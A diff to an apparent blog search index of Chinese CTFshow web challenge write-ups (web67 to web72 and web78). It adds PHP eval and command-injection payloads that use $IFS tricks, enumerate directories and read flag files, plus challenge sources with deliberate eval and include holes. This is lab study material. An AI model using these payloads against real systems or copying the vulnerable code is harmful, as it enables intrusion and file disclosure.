@@ -226,6 +226,7 @@
 </blockquote>
 <blockquote>
 <p>在 Linux 中与cat有类似功能的有如下字符：<br><code>cat</code>，<code>tac</code>，<code>more</code>，<code>less</code>，<code>head</code>，<code>tail</code>，<code>nl</code>，<code>sed</code>，<code>sort</code>，<code>uniq</code>，<code>rev</code></p>
+<p>more：一页一页的显示档案内容<br>less：与 more 类似<br>tac：从最后一行开始显示<br>head：查看头几行<br>tail：查看尾几行<br>nl：显示的时候，顺便输出行号<br>od：以二进制的方式读取档案内容<br>vi：一种编辑器，这个也可以查看<br>vim：一种编辑器，这个也可以查看<br>sort：可以查看<br>uniq：可以查看<br>file -f：报错出具体内容<br>grep：<code>grep test *file strings</code>，在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
 </blockquote>
 <p><strong>payload</strong>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo(&#96;tac\$IFS\$9f*&#96;);</span><br><span class="line">?c&#x3D;echo(&#96;tac\$&#123;IFS&#125;f*&#96;);</span><br><span class="line">?c&#x3D;echo(&#96;more%09f*&#96;);	然后查看源码即可</span><br></pre></td></tr></table></figure>
@@ -512,7 +513,7 @@
 <p>即1为<code>$((~$((~$(())+~$(())))))</code>或<code>$((~$(($((~$(())))$((~$(())))))))</code>或者将-1求负即可<code>$((-$((~$(())))))</code></p>
 </blockquote>
 <p>可以利用-1构造出-37然后取反即可得到36</p>
-<p>所以，payload为</p>
+<p>所以，<strong>payload</strong>为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
 
 <p>因为使用的cat命令，所以还需要查看源代码</p>
@@ -547,7 +548,7 @@
 
 <p>先使用<code>c=print_r(scandir(getcwd()));</code>显示当前目录文件发现没有其他文件</p>
 <p>然后尝试<code>c=print_r(scandir(&quot;/&quot;));</code>打印根目录发现根目录下有一个flag.txt</p>
-<p>使用payload：<code>c=highlight_file(&quot;/flag.txt&quot;);</code>即可</p>
+<p>使用<strong>payload</strong>：<code>c=highlight_file(&quot;/flag.txt&quot;);</code>即可</p>
 <h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>题目代码未变</p>
 <p>print_r() 函数被ban了，改用var_dump() 函数即可</p>
 <h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><img src="/2021/08/22/CTFshow-web/43.jpg" style="zoom:33%;">
@@ -557,6 +558,31 @@
 <p>同样先查看根目录<code>c=var_dump(scandir(&quot;/&quot;));</code>，发现flag.txt还在那</p>
 <p>换个函数读取文件即可，例如include() 函数或者require() 函数</p>
 <h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p>var_dump() 函数被ban</p>
+<p>使用笨方法遍历目录</p>
+<blockquote>
+<p>读取目录的方法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); <span class="comment">// 列当前目录</span></span><br><span class="line">print_r(glob(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// 列根目录</span></span><br><span class="line">print_r(scandir(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"><span class="variable">$d</span>=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$d</span>=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="variable">$d</span>-&gt;read()))&#123;<span class="keyword">echo</span><span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=glob(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>由于print_r() 被ban，因此只能使用后四种方法</p>
+<p><strong>payload</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;.&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现 flag.txt 然后包含读取即可<code>c=include(&quot;/flag.txt&quot;);</code></p>
+<h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><p>payload同上</p>
+<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>highlight_file() 依然被禁用，所以不显示源码，但附件给出了源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
+
+<p>前半部分与之前相同，但执行之后会将输出缓冲区的数字字母替换为问号</p>
+<p>可以在payload后加一个exit() 从而不执行后面的替换步骤</p>
+<p><strong>payload</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;exit();</span><br><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
+
+<h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>题目代码未变，opendir() 函数操作受到了限制</p>
+<p>换一个payload，只有这个payload可以使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();</span><br></pre></td></tr></table></figure>
+
+<p>发现新的flag文件名为flag0.txt</p>
+<p>但是当想读取文件时发现include() ，require() ，include_once() ，require_once() 都被ban了</p>
 <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">## -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment">## <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">## <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>通<strong>GET</strong>方式获取参数”file”，</p>
@@ -2389,7 +2415,7 @@
 <p><a href="ftp://ftp.is.co.za/rfc/rfc1808.txt">ftp://ftp.is.co.za/rfc/rfc1808.txt</a>   </p>
 <p><a href="http://www.ietf.org/rfc/rfc2396.txt">http://www.ietf.org/rfc/rfc2396.txt</a>    </p>
 <p>ldap://[2001:db8::7]/c=GB?objectClass?one    </p>
-<p>mailto:<a href="mailto:&#x4a;&#111;&#x68;&#x6e;&#46;&#68;&#x6f;&#x65;&#x40;&#101;&#120;&#97;&#109;&#112;&#108;&#x65;&#x2e;&#99;&#111;&#109;">&#x4a;&#111;&#x68;&#x6e;&#46;&#68;&#x6f;&#x65;&#x40;&#101;&#120;&#97;&#109;&#112;&#108;&#x65;&#x2e;&#99;&#111;&#109;</a>    </p>
+<p>mailto:<a href="mailto:&#x4a;&#111;&#104;&#110;&#46;&#68;&#x6f;&#101;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#46;&#99;&#x6f;&#109;">&#x4a;&#111;&#104;&#110;&#46;&#68;&#x6f;&#101;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#46;&#99;&#x6f;&#109;</a>    </p>
 <p>news:comp.infosystems.<a href="http://www.servers.unix/">www.servers.unix</a>    </p>
 <p>tel:+1-816-555-1212    </p>
 <p>telnet://192.0.2.16:80/    </p>
@@ -2885,6 +2911,42 @@
 </ul>
 </li>
 </ul>
+<h4 id="dir"><a href="#dir" class="headerlink" title="dir()"></a>dir()</h4><blockquote>
+<p>dir() 函数返回 Directory 类的实例。该函数用于读取一个目录，包含如下：</p>
+<ul>
+<li>给定的要打开的目录</li>
+<li>dir() 的 handle 和 path 两个属性是可用的</li>
+<li>handle 和 path 属性有三个方法：read()、rewind() 和 close()</li>
+</ul>
+</blockquote>
+<ul>
+<li><p><strong>语法</strong>：<code>dir(directory,context);</code></p>
+</li>
+<li><p><strong>参数</strong>：</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">directory</td>
+<td align="left">必需，规定要打开的目录</td>
+</tr>
+<tr>
+<td align="left">context</td>
+<td align="left">可选</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>技术细节</strong>：</p>
+<ul>
+<li>返回值：返回 Directory 类的实例。失败则返回 FALSE</li>
+<li>PHP版本：4.0+</li>
+</ul>
+</li>
+</ul>
 <h4 id="dirname"><a href="#dirname" class="headerlink" title="dirname()"></a>dirname()</h4><blockquote>
 <p>dirname() 函数返回路径中的目录名称部分</p>
 </blockquote>
@@ -3231,6 +3293,45 @@
 </ul>
 </li>
 </ul>
+<h4 id="ob-get-contents"><a href="#ob-get-contents" class="headerlink" title="ob_get_contents()"></a>ob_get_contents()</h4><blockquote>
+<p>返回输出缓冲区的内容</p>
+</blockquote>
+<ul>
+<li><strong>语法</strong>：<code>ob_get_contents()</code></li>
+<li><strong>返回值</strong>：此函数返回输出缓冲区的内容，或者如果输出缓冲区无效将返回 false</li>
+</ul>
+<h4 id="opendir"><a href="#opendir" class="headerlink" title="opendir()"></a>opendir()</h4><blockquote>
+<p>opendir() 函数打开目录句柄</p>
+</blockquote>
+<ul>
+<li><p><strong>语法</strong>：<code>opendir(path,context);</code></p>
+</li>
+<li><p><strong>参数</strong>：</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>path</em></td>
+<td align="left">必需。规定要打开的目录路径</td>
+</tr>
+<tr>
+<td align="left"><em>context</em></td>
+<td align="left">可选。规定目录句柄的环境。context 是可修改目录流的行为的一套选项</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>技术细节：</p>
+<ul>
+<li>返回值：成功则返回目录句柄资源。失败则返回 FALSE。如果路径不是合法目录，或者由于许可限制或文件系统错误导致的目录不能打开，则抛出 E_WARNING 级别的错误。您可以通过在函数名称前添加 ‘@’ 来隐藏 opendir() 的错误输出</li>
+<li>PHP版本：4.0+</li>
+<li>PHP更新日志：PHP 5.0：path 参数支持 ftp:// URL 封装协议</li>
+</ul>
+</li>
+</ul>
 <h4 id="pos"><a href="#pos" class="headerlink" title="pos()"></a>pos()</h4><blockquote>
 <p><strong>该函数是 current() 函数的别名</strong></p>
 <p>pos() 函数返回数组中的当前元素的值</p>
@@ -3296,7 +3397,25 @@
 <li>$return: 可选，如果为 true 则不输出结果，而是将结果赋值给一个变量，false 则直接输出结果</li>
 </ul>
 </li>
-<li><p><strong>返回值</strong>：<code>$return</code>如果设为<strong>true</strong>才有返回值，为一个易于理解的字符串信息</p>
+<li><p><strong>返回值</strong>：<code>$return</code>如果设为 true 才有返回值，为一个易于理解的字符串信息</p>
+</li>
+</ul>
+<h4 id="readdir"><a href="#readdir" class="headerlink" title="readdir()"></a>readdir()</h4><blockquote>
+<p>readdir() 函数返回目录中下一个文件的文件名</p>
+</blockquote>
+<ul>
+<li><p><strong>语法</strong>：<code>readdir(dir_handle);</code></p>
+</li>
+<li><p><strong>参数</strong>：</p>
+<ul>
+<li>dir_handle：可选，指定之前由 opendir() 打开的目录句柄资源，如果该参数未指定，则使用最后一个由 opendir() 打开的链接</li>
+</ul>
+</li>
+<li><p><strong>技术细节</strong>：</p>
+<ul>
+<li>返回值：成功则返回文件名，失败则返回 FALSE</li>
+<li>PHP版本：4.0+</li>
+</ul>
 </li>
 </ul>
 <h4 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h4><blockquote>
@@ -6792,20 +6911,6 @@
       <tags>
         <tag>CTF</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>love</title>
-    <url>/2021/11/17/love/</url>
-    <content><![CDATA[<?php
-
-echo "1";
-
-sleep(3);
-
-echo "2";
-
-?>
-]]></content>
   </entry>
   <entry>
     <title>攻防世界-wp</title>
